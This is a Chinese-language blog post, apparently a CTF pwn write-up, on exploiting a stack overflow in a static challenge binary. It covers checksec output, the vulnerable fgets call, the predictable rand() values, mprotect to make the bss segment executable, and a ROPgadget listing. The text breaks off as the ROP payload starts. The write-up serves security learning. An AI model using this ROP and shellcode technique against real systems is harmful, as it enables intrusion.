@@ -1,0 +1,412 @@
+<!doctype html>
+<html lang="zh">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Guessing Game 1 · dx3906</title>
+    <meta name="description" content="关于 mprotect 函数的应用（其实完全可以用系统调用）">
+    <link rel="canonical" href="https://dx3906999.github.io/posts/ucas-ctf-pwn-guessing-name-1/">
+    <link rel="alternate" hreflang="zh" href="https://dx3906999.github.io/posts/ucas-ctf-pwn-guessing-name-1/">
+    <link rel="alternate" hreflang="x-default" href="https://dx3906999.github.io/posts/ucas-ctf-pwn-guessing-name-1/">
+    
+    <meta property="og:title" content="Guessing Game 1 · dx3906">
+    <meta property="og:description" content="关于 mprotect 函数的应用（其实完全可以用系统调用）">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://dx3906999.github.io/posts/ucas-ctf-pwn-guessing-name-1/">
+    <meta property="og:site_name" content="dx3906">
+    
+    <meta property="article:published_time" content="2024-04-18T14:41:58.000Z">
+    <meta property="article:modified_time" content="2024-04-18T14:41:58.000Z">
+    <meta name="theme-color" content="#ece8df" media="(prefers-color-scheme: light)">
+    <meta name="theme-color" content="#111316" media="(prefers-color-scheme: dark)">
+    <link rel="alternate" type="application/atom+xml" title="dx3906" href="/atom.xml">
+    <script>(() => {
+  try {
+    const v = localStorage.getItem('apogee.scheme');
+    if (v === 'light' || v === 'dark') document.documentElement.dataset.scheme = v;
+  } catch {}
+  document.documentElement.classList.add('js');
+})();</script>
+    <script>(() => {
+  const key = "dxbe.lang:";
+  const redirectedKey = "dxbe.lang.redirected:";
+  const supported = {"zh":"/","en":"/en/"};
+  try {
+    document.addEventListener('click', (event) => {
+      const node = event.target;
+      if (!(node instanceof Element)) return;
+      const link = node.closest('a[data-language]');
+      if (!link) return;
+      const code = link.getAttribute('data-language');
+      if (code && Object.prototype.hasOwnProperty.call(supported, code)) {
+        try { localStorage.setItem(key, code); } catch {}
+      }
+    });
+    let stored = null;
+    try { stored = localStorage.getItem(key); } catch {}
+    if (stored) {
+      if (true && stored !== "zh" && Object.prototype.hasOwnProperty.call(supported, stored)) {
+        location.replace(supported[stored] + location.search + location.hash);
+      }
+      return;
+    }
+    let redirected = null;
+    try { redirected = sessionStorage.getItem(redirectedKey); } catch {}
+    if (redirected) return;
+    if (!true) return;
+    const home = "/";
+    const path = location.pathname.replace(new RegExp('/+$'), '') || '/';
+    const homePath = home.replace(new RegExp('/+$'), '') || '/';
+    if (path !== homePath) return;
+    const preferred = navigator.languages && navigator.languages.length
+      ? navigator.languages
+      : [navigator.language];
+    for (const value of preferred) {
+      const tag = String(value || '').toLowerCase();
+      const match = Object.keys(supported).find((code) => tag === code || tag.startsWith(code + '-'));
+      if (match) {
+        if (match !== "zh") {
+          try { sessionStorage.setItem(redirectedKey, '1'); } catch {}
+          location.replace(supported[match] + location.search + location.hash);
+        }
+        return;
+      }
+    }
+  } catch {}
+})();</script>
+    <link rel="preload" href="/assets/apogee/fonts/archivo-latin-standard.woff2?v=e3a28eade2" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="/assets/apogee/fonts/jetbrains-mono-latin-wght.woff2?v=18be452724" as="font" type="font/woff2" crossorigin>
+    <style>@font-face{font-family:"Archivo";src:url("/assets/apogee/fonts/archivo-latin-standard.woff2?v=e3a28eade2") format("woff2");font-weight:100 900;font-stretch:62% 125%;font-display:swap;unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD}@font-face{font-family:"JetBrains Mono";src:url("/assets/apogee/fonts/jetbrains-mono-latin-wght.woff2?v=18be452724") format("woff2");font-weight:100 800;font-display:swap;unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD}</style>
+    <link rel="stylesheet" href="/assets/apogee/css/site.css?v=93355c09ce">
+    
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Guessing Game 1","description":"关于 mprotect 函数的应用（其实完全可以用系统调用）","datePublished":"2024-04-18T14:41:58.000Z","dateModified":"2024-04-18T14:41:58.000Z","inLanguage":"zh","author":{"@type":"Person","name":"dx3906"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://dx3906999.github.io/posts/ucas-ctf-pwn-guessing-name-1/"},"url":"https://dx3906999.github.io/posts/ucas-ctf-pwn-guessing-name-1/","keywords":"ctf, writeup, pwn"}</script>
+  </head>
+  <body class="ap ap--post ap--panel" data-epoch="2024-04-18T22:41:58+08:00">
+    <a class="ap-skip" href="#main">跳到正文</a>
+    <div class="ap-shell">
+      <aside class="ap-rail" id="ap-rail" aria-label="主导航">
+    <div class="ap-rail__inner">
+      <div class="ap-ident">
+        <p class="ap-label"><span class="ap-label__key">STA</span> 1715 <span class="ap-sep">/</span> 中文</p>
+        <a class="ap-ident__title" href="/">dx3906</a>
+        <p class="ap-ident__tag">Unstoppable</p>
+        <span class="ap-ident__plate" aria-hidden="true">
+          <span></span><span></span><span></span><span></span><span></span>
+        </span>
+      </div>
+      <nav class="ap-nav" aria-label="主导航">
+        <ol><li>
+        <a class="ap-nav__link" href="/">
+          <span class="ap-nav__idx">01</span>
+          <span class="ap-nav__label">首页</span>
+          <span class="ap-nav__tick" aria-hidden="true"></span>
+        </a>
+      </li><li>
+        <a class="ap-nav__link" href="/posts/" aria-current="page">
+          <span class="ap-nav__idx">02</span>
+          <span class="ap-nav__label">文章</span>
+          <span class="ap-nav__tick" aria-hidden="true"></span>
+        </a>
+      </li><li>
+        <a class="ap-nav__link" href="/categories/">
+          <span class="ap-nav__idx">03</span>
+          <span class="ap-nav__label">分类</span>
+          <span class="ap-nav__tick" aria-hidden="true"></span>
+        </a>
+      </li><li>
+        <a class="ap-nav__link" href="/tags/">
+          <span class="ap-nav__idx">04</span>
+          <span class="ap-nav__label">标签</span>
+          <span class="ap-nav__tick" aria-hidden="true"></span>
+        </a>
+      </li><li>
+        <a class="ap-nav__link" href="/archives/">
+          <span class="ap-nav__idx">05</span>
+          <span class="ap-nav__label">归档</span>
+          <span class="ap-nav__tick" aria-hidden="true"></span>
+        </a>
+      </li></ol>
+      </nav>
+      <div class="ap-rail__foot">
+        <div class="ap-met" aria-hidden="true">
+            <span class="ap-label">MET</span>
+            <span class="ap-met__value" data-met>T+ 000:00:00:00</span>
+          </div>
+        <div class="ap-controls">
+          <div class="ap-seg" role="group" aria-label="语言"><a class="ap-seg__opt" href="/posts/ucas-ctf-pwn-guessing-name-1/" data-language="zh" hreflang="zh" aria-current="true">ZH</a><a class="ap-seg__opt" href="/en/" data-language="en" hreflang="en">EN</a></div>
+          <button class="ap-switch" type="button" data-scheme-toggle aria-label="切换明暗">
+            <span class="ap-switch__track"><span class="ap-switch__knob"></span></span>
+            <span class="ap-switch__label" data-scheme-label>昼</span>
+          </button>
+        </div>
+        <div class="ap-links">
+          <a class="ap-chip" href="https://github.com/dx3906999/" rel="me noopener">GitHub</a>
+          <a class="ap-chip" href="/atom.xml"><svg viewBox="0 0 16 16" width="12" height="12"><path d="M3 3a10 10 0 0 1 10 10M3 7a6 6 0 0 1 6 6" fill="none" stroke="currentColor" stroke-width="1.6"/><circle cx="4" cy="12" r="1.4" fill="currentColor"/></svg><span>RSS</span></a>
+        </div>
+      </div>
+    </div>
+  </aside>
+      <div class="ap-scrim" data-rail-close aria-hidden="true"></div>
+      <div class="ap-stage">
+        <header class="ap-top">
+    <button class="ap-top__menu" type="button" data-rail-toggle aria-controls="ap-rail" aria-expanded="false" aria-label="打开导航">
+      <span></span><span></span><span></span>
+    </button>
+    <nav class="ap-crumb" aria-label="breadcrumb">
+      <a href="/">SYS</a>
+      <span class="ap-sep" aria-hidden="true">/</span>
+      <a href="/archives/">LOG</a><span class="ap-sep" aria-hidden="true">/</span><span aria-current="page">24.109</span>
+    </nav>
+    <form class="ap-query" action="/search/" method="get" role="search">
+      <label class="ap-query__label" for="ap-q">QRY</label>
+      <input id="ap-q" name="q" type="search" placeholder="搜索文章" autocomplete="off">
+      <span class="ap-query__icon" aria-hidden="true"><svg viewBox="0 0 16 16" width="14" height="14"><circle cx="7" cy="7" r="4.5" fill="none" stroke="currentColor" stroke-width="1.5"/><path d="M10.5 10.5 14 14" stroke="currentColor" stroke-width="1.5"/></svg></span>
+    </form>
+    <div class="ap-progress" aria-hidden="true"><span data-progress></span></div>
+  </header>
+        <div class="ap-grid">
+          <main id="main" class="ap-main" tabindex="-1">
+            <article class="ap-article"
+      data-pagefind-body
+      data-pagefind-filter="lang:zh"
+      data-pagefind-meta="title:Guessing Game 1">
+    <header class="ap-dossier" data-reveal>
+      <div class="ap-dossier__bar">
+        <span class="ap-label"><span class="ap-label__key">LOG</span> 24.109</span>
+        <span class="ap-label ap-label--dim">STA 0181</span>
+        <span class="ap-hazard" aria-hidden="true"></span>
+      </div>
+      
+      <h1 class="ap-dossier__title">Guessing Game 1</h1>
+      <p class="ap-dossier__sum">关于 mprotect 函数的应用（其实完全可以用系统调用）</p>
+      <dl class="ap-spec">
+        <div><dt>发布</dt><dd><time datetime="2024-04-18T22:41:58+08:00">2024.04.18</time></dd></div>
+        
+        <div><dt>阅读</dt><dd>04 分钟</dd></div>
+        <div><dt>语言</dt><dd>ZH</dd></div>
+        <div><dt>分类</dt><dd><a href="/categories/ctf-pwn/">ctf_pwn</a></dd></div>
+      </dl>
+      <div class="ap-stripe" aria-hidden="true"><i></i><i></i><i></i><i></i><i></i></div>
+    </header>
+    <div class="ap-prose"><h2 id="guessing-game-1"><a class="heading-anchor" href="#guessing-game-1">Guessing Game 1</a></h2>
+<p>关于 <code>mprotect</code> 函数的应用（其实完全可以用系统调用）</p>
+<h3 id="0x01-常规看看"><a class="heading-anchor" href="#0x01-常规看看">0x01 常规看看</a></h3>
+<p>题目给了三个文件，通过makefile可知程序是静态编译</p>
+<pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">gcc</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF"> -m64</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF"> -fno-stack-protector</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF"> -O0</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF"> -no-pie</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF"> -static</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF"> -o</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> vuln</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> vuln.c</span></span></code></pre>
+<pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">[</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">*</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">] </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">'/home/kali/ctf/pwn/q36_guessing_game_1/vuln'</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">    Arch:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">     amd64-64-little</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">    RELRO:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">    Partial</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> RELRO</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">    Stack:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">    Canary</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> found</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> </span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">    NX:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">       NX</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> enabled</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">    PIE:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">      No</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> PIE</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> (0x400000)</span></span></code></pre>
+<p>事实上这次checksec有些不准，应没有canary</p>
+<p>没开启栈保护</p>
+<p>读源码发现存在栈溢出漏洞</p>
+<pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">#define</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0"> BUFSIZE</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF"> 100</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">void</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0"> win</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">() {</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">	char</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70"> winner</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">[BUFSIZE];</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">	printf</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">"New winner!</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">Name? "</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">	fgets</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(winner, </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">360</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">, stdin);</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">	printf</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">"Congrats </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">%s\n\n</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF">"</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">, winner);</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">}</span></span></code></pre>
+<p>此外，由于没有设种，随机数是伪随机数，另写一个程序便可知其随机数序列（要用linux编译运行）,这样我们就可以轻松利用这个漏洞了</p>
+<h3 id="0x02-初步分析"><a class="heading-anchor" href="#0x02-初步分析">0x02 初步分析</a></h3>
+<p>程序中没有 <code>system()</code> 函数和 <code>/bin/sh</code> 字符串，又是静态编译，无法像之前那样通过libc获取，只能使用shellcode了</p>
+<p>但程序中栈不可执行，且无法得知栈的确切位置，只能通过别的方法注入shellcode</p>
+<p>想到用shellcode覆盖一段bss段数据，然后将返回地址覆盖到该段执行shellcode。用gdb的 <code>vmmap</code> 命令查看，bss段可读可写不可执行，所以要想执行shellcode，就先要把bss段修改为可读可写可执行权限。</p>
+<p>这里需要用到 <code>mprotect()</code> 函数。</p>
+<h3 id="0x03-mprotect"><a class="heading-anchor" href="#0x03-mprotect">0x03 mprotect()</a></h3>
+<p>linux中 <code>mprotect()</code> 可以用来修改一段指定内存区域的保护属性</p>
+<p>函数原型：</p>
+<pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">#include</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> &#x3C;unistd.h></span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">   </span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">#include</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> &#x3C;sys/mmap.h></span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">   </span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">int</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0"> mprotect</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">const</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583"> void</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583"> *</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70">start</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">, </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">size_t</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70"> len</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">, </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">int</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70"> prot</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">);</span></span></code></pre>
+<p>参数：</p>
+<ul>
+<li><code>start</code> 修改权限开始地址，必须是一个内存页的起始地址，一页为 <code>0x1000</code></li>
+<li><code>len</code> 修改长度</li>
+<li><code>prot</code> 权限属性
+<ul>
+<li><code>PROT_READ=4</code> 可读</li>
+<li><code>PROT_WRITE=2</code> 可写</li>
+<li><code>PROT_EXEC=1</code> 可执行</li>
+<li><code>PROT_NONE=0</code> 没有以上三种权限</li>
+</ul>
+</li>
+</ul>
+<p>返回值：</p>
+<ul>
+<li><code>0</code> success</li>
+<li><code>-1</code> fail, 并且系统调用错误码被覆盖</li>
+</ul>
+<p>如果对内存进行不合权限的操作，内核会产生 <code>Segmentation fault</code></p>
+<p>这里我们希望bss段可读可写可执行，应将 <code>prot</code> 置为 <code>7</code></p>
+<h3 id="0x04-pwn-it"><a class="heading-anchor" href="#0x04-pwn-it">0x04 Pwn it！</a></h3>
+<p>由于是64位程序，传6个以内的参数依次由 <code>rdi,rsi,rdx,rcx,r8,r9</code>进行，所以我们首先要找 <code>gadget</code> ，即形如 <code>pop rdi;ret</code> 的小片段以进行参数传递</p>
+<pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">ROPgadget</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF"> --binary</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> vuln</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF"> --only</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> "pop|ret"</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0"> grep</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF"> -E</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> "rdi|rsi|rdx"</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">0x0000000000482776</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> :</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> rax</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> rdx</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> rbx</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">ret</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">0x00000000004026f5</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> :</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> rdi</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> rbp</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">ret</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">0x0000000000400696</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> :</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> rdi</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">ret</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">0x000000000047099d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> :</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> rdi</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">ret</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF"> 0xfffd</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">0x000000000044cc24</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> :</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> rdx</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> r10</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">ret</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">0x0000000000482777</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> :</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> rdx</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> rbx</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">ret</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">0x000000000044cc49</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> :</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> rdx</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> rsi</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">ret</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">0x000000000044cc26</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> :</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> rdx</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">ret</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">0x00000000004026f3</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> :</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> rsi</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> r15</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> rbp</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">ret</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">0x0000000000400694</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> :</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> rsi</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> r15</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">ret</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">0x000000000041025e</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> :</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> rsi</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> rbp</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">ret</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">0x0000000000410ca3</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> :</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> pop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF"> rsi</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8"> ; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0">ret</span></span></code></pre>
+<p>于是可以在处理好随机数后构造 <code>payload1</code> ，给bss段提权</p>
+<pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">rdi_addr</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">0000000000400696</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">rsi_addr</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">0000000000410ca3</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">rdx_addr</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583">=0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF">000000000044cc26</span></span>
